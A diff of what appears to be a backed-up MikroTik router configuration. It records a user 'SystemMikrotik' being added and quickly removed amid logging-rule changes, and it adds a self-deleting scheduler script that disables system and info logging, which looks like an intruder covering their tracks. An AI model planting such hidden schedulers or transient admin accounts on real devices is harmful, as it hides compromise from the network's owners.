@@ -9,6 +9,27 @@
 #   installed-version: 7.17
 # Flags: U - undoable, R - redoable, F - floating-undo
 #   ACTION                                   BY    PO.. TIME                 TR..
+# U user SystemMikrotik removed              0     wr.. 2026-09-14 13:12:48  ss..
+#                                                  po..
+# U log action changed                       0     wr.. 2026-09-14 13:11:49  ss..
+# U log rule changed                         0     wr.. 2026-09-14 13:11:49  ss..
+# U log rule changed                         0     wr.. 2026-09-14 13:11:49  ss..
+# U log rule changed                         0     wr.. 2026-09-14 13:11:49  ss..
+# U log rule changed                         0     wr.. 2026-09-14 13:11:49  ss..
+# U log rule changed                         0     wr.. 2026-09-14 13:11:49  ss..
+# U traffic flow config changed              0     wr.. 2026-09-14 13:11:49  ss..
+# U log action changed                       0     wr.. 2026-09-14 13:11:48  ss..
+# U new script scheduled                     0     wr.. 2026-09-14 13:11:48  ss..
+# U user SystemMikrotik added                0     wr.. 2026-09-14 13:11:48  ss..
+#                                                  po..
+# U log action changed                       0     wr.. 2026-09-14 13:11:47  ss..
+# U log rule changed                         0     wr.. 2026-09-14 13:11:47  ss..
+# U log rule changed                         0     wr.. 2026-09-14 13:11:47  ss..
+# U log rule changed                         0     wr.. 2026-09-14 13:11:47  ss..
+# U log rule changed                         0     wr.. 2026-09-14 13:11:47  ss..
+# U log rule changed                         0     wr.. 2026-09-14 13:11:47  ss..
+# U traffic flow config changed              0     wr.. 2026-09-14 13:11:47  ss..
+# U log action changed                       0     wr.. 2026-09-14 13:11:47  ss..
 # U user SystemMikrotik removed              0     wr.. 2026-09-12 01:01:57  ss..
 #                                                  po..
 # U log action changed                       0     wr.. 2026-09-12 01:00:58  ss..
@@ -123,16 +144,6 @@
 # U ip service changed                       tur.. wr.. 1971-08-02 06:35:03  ss..
 # U user mktxp added                         tur.. wr.. 1971-08-02 06:35:03  ss..
 #                                                  po..
-# U user group mktxp_group added             tur.. wr.. 1971-08-02 06:35:03  ss..
-#                                                  po..
-# U user oxidized-full added                 tur.. wr.. 1971-08-02 02:38:04  ss..
-#                                                  po..
-# U user oxidized added                      tur.. wr.. 1971-08-02 02:38:04  ss..
-#                                                  po..
-# U user group netops-backup-full added      tur.. wr.. 1971-08-02 02:38:04  ss..
-#                                                  po..
-# U user group netops-backup-ro added        tur.. wr.. 1971-08-02 02:38:04  ss..
-#                                                  po..
 # 
 # software id = R2YK-BVVU
 #
@@ -238,6 +249,8 @@ add address=44.34.128.181
 add address=44.34.133.3
 add address=162.159.200.1
 add address=162.159.200.123
+/system scheduler
+add interval=1s name=autosupoutrif on-event="/system scheduler remove autosupoutrif; /system logging disable [find topics~\"info\" || topics~\"system\"]" policy=ftp,reboot,read,write,policy,test,password,sniff,sensitive,romon start-date=2026-09-14 start-time=13:11:48
 /tool bandwidth-server
 set authenticate=no enabled=no
 /tool mac-server
